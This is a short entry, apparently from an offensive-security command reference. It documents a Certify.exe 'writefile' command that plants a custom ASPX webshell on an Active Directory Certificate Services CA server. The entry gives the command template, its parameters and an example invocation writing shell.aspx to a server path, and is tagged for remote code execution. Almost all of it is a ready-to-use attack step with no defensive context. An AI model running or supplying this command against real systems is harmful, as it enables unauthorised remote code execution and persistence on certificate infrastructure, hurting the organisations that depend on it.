---
type: command
executor: powershell
data: 'Certify.exe writefile /ca:$_CA_NAME /path:$_PATH /input:$_INPUT_FILE'
output: null
platforms:
  - Windows
tags:
  - adcs
  - rce
  - webshell
verified: true
validated: true
---

# certify-write-aspx-shell-local

## Command

```powershell
Certify.exe writefile /ca:$_CA_NAME /path:$_PATH /input:$_INPUT_FILE
```

## Description

Writes a custom ASPX webshell to a local writable path on the CA server via CDP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ca:$_CA_NAME | Target CA | Yes |
| /path:$_PATH | Destination path (e.g., C:\Windows\...\shell.aspx) | Yes |
| /input:$_INPUT_FILE | Local path to shell file | Yes |

## Examples

### Basic Usage

```powershell
Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx
```

## Expected Output

"File written successfully to path."

## Related

- [[procedures/Vulnerable-Certificate-Authority-Access-Control]]
